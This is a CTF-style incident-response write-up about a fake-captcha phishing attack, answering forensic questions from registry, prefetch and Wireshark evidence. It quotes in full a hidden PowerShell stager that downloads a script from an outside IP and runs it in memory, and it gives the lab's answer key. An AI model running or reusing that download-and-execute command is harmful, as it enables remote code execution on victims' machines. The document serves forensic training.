# Pikaptcha

#web #windows #registry #wireshark

## Speech
> Happy Grunwald contacted the sysadmin, Alonzo, because of issues he had downloading the latest version of Microsoft Office. He had received an email saying he needed to update, and clicked the link to do it. He reported that he visited the website and solved a captcha, but no office download page came back. Alonzo, who himself was bombarded with phishing attacks last year and was now aware of attacker tactics, immediately notified the security team to isolate the machine as he suspected an attack. You are provided with network traffic and endpoint artifacts to answer questions about what happened.

## Analysis

## Questions
1. It is crucial to understand any payloads executed on the system for initial access. Analyzing registry hive for user happy grunwald. What is the full command that was run to download and execute the stager.
    > powershell -NOP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://43.205.115.44/office2024install.ps1')"
    - In the **NTUSER.DAT** of our user, in the **runmru** registry key
2. At what time in UTC did the malicious payload execute?
    > 2024-09-23 05:07:45
    - Can get it in the same registry key as before or just using the powershell prefetch file (use PECMD and Timeline explorer)
3. The payload which was executed initially downloaded a PowerShell script and executed it in memory. What is sha256 hash of the script?
    > 579284442094E1A44BEA9CFB7D8D794C8977714F827C97BCB2822A97742914DE
    - In the **pcapng** file, we know the name of the downloaded file from question 1, we can just extract HTTP object to recover this file and check his hash
4. To which port did the reverse shell connect?
    > 6969
    - We have the powershell script, just by looking at the first line we have the connection to the C2
5. For how many seconds was the reverse shell connection established between C2 and the victim's workstation?
    > 403
    - In **wireshark** Filter on the port 6969 and count the seconds elapsed between the first and the last packet
6. Attacker hosted a malicious Captcha to lure in users. What is the name of the function which contains the malicious payload to be pasted in victim's clipboard?
    > stageClipboard
    - In **wireshark** find the HTTP GET request towerd "/" of the first malicious IP and follow the HTTP stream to get the code of the page, then at the end we have a javascript script and in this code we can find the command from question 1 which is copied in the clipboard by the script.